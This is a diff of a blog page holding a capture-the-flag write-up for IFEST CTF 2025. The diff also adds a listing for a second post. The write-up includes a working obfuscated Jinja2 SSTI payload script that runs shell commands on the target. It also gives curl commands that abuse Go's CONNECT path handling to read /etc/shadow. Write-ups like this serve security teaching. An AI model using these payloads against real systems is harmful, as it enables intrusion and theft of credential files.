@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>IFEST 2025 CTF Writeup | Tanknight Site</title>
+  <title>IFEST CTF 2025 Writeup | Tanknight Site</title>
   <meta name="keywords" content=" mass-assignment , ssrf , nginx-misconfig , ssti , command-injection , parser-discrepancies , path-traversal ">
-  <meta name="description" content="IFEST 2025 CTF Writeup | Tanknight Site">
+  <meta name="description" content="IFEST CTF 2025 Writeup | Tanknight Site">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta property="og:type" content="website">
 <meta property="og:title" content="about">
@@ -132,7 +132,7 @@
     <li>
         <div class="all active" data-rel="All">All
             
-                <small>(1)</small>
+                <small>(2)</small>
             
         </div>
     </li>
@@ -144,7 +144,7 @@
         <div data-rel="writeups">
             
             writeups
-            <small>(1)</small>
+            <small>(2)</small>
         </div>
         
     </li>
@@ -165,8 +165,8 @@
         
     </div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="1">
-<input type="hidden" id="yelog_site_word_count" value="888">
+<input type="hidden" id="yelog_site_posts_number" value="2">
+<input type="hidden" id="yelog_site_word_count" value="4.3k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -212,7 +212,15 @@
     <div class="tag-wrapper">
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>arbitrary-file-read</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>command-injection</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>file-upload</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -239,6 +247,10 @@
                 <i class="iconfont icon-tag"></i><a>ssti</a>
             </li>
         
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>xss</a>
+            </li>
+        
     </div>
 
 </div>
@@ -248,10 +260,19 @@
         
         
         <a  class="All writeups "
+           href="/2026/07/14/ACECTF-2025-Writeup/"
+           data-tag="ssrf,xss,file-upload,arbitrary-file-read"
+           data-author="" >
+            <span class="post-title" title="ACE CTF 2025 Writeup">ACE CTF 2025 Writeup</span>
+            <span class="post-date" title="2026-07-14 02:30:53">2026/07/14</span>
+        </a>
+        
+        
+        <a  class="All writeups "
            href="/2026/07/13/IFEST-2025-CTF-Writeup/"
            data-tag="mass-assignment,ssrf,nginx-misconfig,ssti,command-injection,parser-discrepancies,path-traversal"
            data-author="" >
-            <span class="post-title" title="IFEST 2025 CTF Writeup">IFEST 2025 CTF Writeup</span>
+            <span class="post-title" title="IFEST CTF 2025 Writeup">IFEST CTF 2025 Writeup</span>
             <span class="post-date" title="2026-07-13 22:01:00">2026/07/13</span>
         </a>
         
@@ -275,7 +296,7 @@
     <div class="pjax">
         <article id="post-IFEST-2025-CTF-Writeup" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">IFEST 2025 CTF Writeup</h1>
+        <h1 class="article-title">IFEST CTF 2025 Writeup</h1>
     
     <div class="article-meta">
         
@@ -312,12 +333,12 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2026-07-13 23:29:49'>2026-07-13 22:01</time>
+            Created At : <time class="date" title='Updated At: 2026-07-14 03:17:08'>2026-07-13 22:01</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:888</span>
+        <span>Count:890</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -366,13 +387,41 @@
 <p><img src="/../images/IFEST-2025-CTF-Writeup-5.png"></p>
 <p>One common SSTI proof of concept is <code>{{7*7}}</code>, which gets evaluated as <code>49</code>. However, the application blocks both <code>{{</code> and <code>}}</code>.</p>
 <p>Fortunately, Jinja2 provides another syntax that works just as well:</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{% if 7*7==49 %}49{% endif %}</span><br></pre></td></tr></tbody></table></figure>
-
+<pre><code class="language-jinja2">{% if 7*7==49 %}49{% endif %}
+</code></pre>
 <p>Now the goal is to bypass the blacklist and achieve RCE. I found a useful resource for building Jinja2 SSTI payloads:</p>
 <p><a target="_blank" rel="noopener" href="https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/">https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/</a></p>
 <p>Next, I wrote the following solver:</p>
-<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solver</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="comment"># Cat flag and save it to static/testing12312</span></span><br><span class="line">    payload = <span class="string">r"""{% if request|attr('\x61pplication')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x62uiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fi\x6dport\x5f\x5f')('o\x73')|attr('popen')('cat reward/fl\x2a &gt;&gt; static/testing12312') %} a {%endif%}"""</span></span><br><span class="line">    trigger_ssti(url, payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Read flag</span></span><br><span class="line">    res = requests.get(<span class="string">f"<span class="subst">{url}</span>/static/testing12312"</span>)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Delete the file to avoid unintended access by other participants</span></span><br><span class="line">    payload = <span class="string">r"""{% if request|attr('\x61pplication')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x62uiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fi\x6dport\x5f\x5f')('o\x73')|attr('popen')('rm static/testing12312') %} a {%endif%}"""</span></span><br><span class="line">    trigger_ssti(url, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trigger_ssti</span>(<span class="params">url, payload</span>):</span><br><span class="line">    url = <span class="string">f"<span class="subst">{url}</span>/?title=<span class="subst">{quote(payload)}</span>"</span></span><br><span class="line">    res = requests.get(url)</span><br><span class="line">    res = BeautifulSoup(res.text,<span class="string">'html.parser'</span>).find(<span class="string">'h1'</span>, class_=<span class="string">'display-4 fst-italic'</span>)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    url = <span class="string">"http://103.163.139.198:8888"</span></span><br><span class="line">    solver(url)</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="language-python">import requests
+from bs4 import BeautifulSoup
+from urllib.parse import quote
 
+
+def solver(url):
+    # Cat flag and save it to static/testing12312
+    payload = r"""{% if request|attr('\x61pplication')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x62uiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fi\x6dport\x5f\x5f')('o\x73')|attr('popen')('cat reward/fl\x2a &gt;&gt; static/testing12312') %} a {%endif%}"""
+    trigger_ssti(url, payload)
+
+    # Read flag
+    res = requests.get(f"{url}/static/testing12312")
+    print(res.text)
+
+    # Delete the file to avoid unintended access by other participants
+    payload = r"""{% if request|attr('\x61pplication')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x62uiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fi\x6dport\x5f\x5f')('o\x73')|attr('popen')('rm static/testing12312') %} a {%endif%}"""
+    trigger_ssti(url, payload)
+
+
+def trigger_ssti(url, payload):
+    url = f"{url}/?title={quote(payload)}"
+    res = requests.get(url)
+    res = BeautifulSoup(res.text,'html.parser').find('h1', class_='display-4 fst-italic')
+    print(res)
+
+
+if __name__ == "__main__":
+    url = "http://103.163.139.198:8888"
+    solver(url)
+</code></pre>
 <p><img src="/../images/IFEST-2025-CTF-Writeup-6.png"></p>
 <hr>
 <h2 id="Orbiter"><a href="#Orbiter" class="headerlink" title="Orbiter"></a>Orbiter</h2><p>The challenge exposed a <code>phpinfo.php</code> file that leaked the credentials required to log in. The password turned out to be the first part of the flag.</p>
@@ -427,8 +476,8 @@
 <p>Normally, Go automatically normalizes URL paths. However, when the HTTP method is <code>CONNECT</code>, Go skips the normalization step, making path traversal possible.</p>
 <p><img src="/../images/IFEST-2025-CTF-Writeup-24.png"></p>
 <p>Using the following command:</p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">"http://103.163.139.198:8888/../../../etc/shadow"</span> -X CONNECT --path-as-is</span><br></pre></td></tr></tbody></table></figure>
-
+<pre><code class="language-bash">curl "http://103.163.139.198:8888/../../../etc/shadow" -X CONNECT --path-as-is
+</code></pre>
 <p>I was able to read the contents of <code>/etc/shadow</code>.</p>
 <p><img src="/../images/IFEST-2025-CTF-Writeup-25.png"></p>
 <p>While browsing <code>/about.html</code>, I noticed a link pointing to <code>/docs/text</code>, but the file didn’t exist.</p>
@@ -436,8 +485,8 @@
 <p>After some investigation, I found that the <code>docs</code> directory was actually located one level above the current directory.</p>
 <p><img src="/../images/IFEST-2025-CTF-Writeup-27.png"></p>
 <p>Using path traversal again, I retrieved the flag with:</p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">"http://103.163.139.198:8888/../docs/text"</span> -X CONNECT --path-as-is</span><br></pre></td></tr></tbody></table></figure>
-
+<pre><code class="language-bash">curl "http://103.163.139.198:8888/../docs/text" -X CONNECT --path-as-is
+</code></pre>
 <p><img src="/../images/IFEST-2025-CTF-Writeup-28.png"></p>
 <p>Flag:</p>
 <p><code>IFEST13{g0L4nG_5UpP0rt5_p4th_Tr4V3rs4L_w1tH_CONNECT}</code></p>
